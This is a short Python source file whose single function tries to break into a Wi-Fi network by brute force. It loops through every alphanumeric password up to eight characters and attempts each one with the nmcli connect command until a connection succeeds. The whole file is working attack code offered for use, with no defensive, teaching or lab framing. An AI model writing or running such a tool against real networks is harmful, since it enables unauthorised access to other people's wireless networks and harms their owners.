# core/brute_force_attack.py
import itertools
import subprocess

def brute_force_attack(ssid, max_length=8):
    characters = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
    for length in range(1, max_length + 1):
        for password in itertools.product(characters, repeat=length):
            password = ''.join(password)
            try:
                result = subprocess.run(['nmcli', 'dev', 'wifi', 'connect', ssid, 'password', password], capture_output=True, text=True)
                if 'successfully activated' in result.stdout:
                    return f"Password found: {password}"
            except Exception as e:
                return str(e)
    return "Password not found"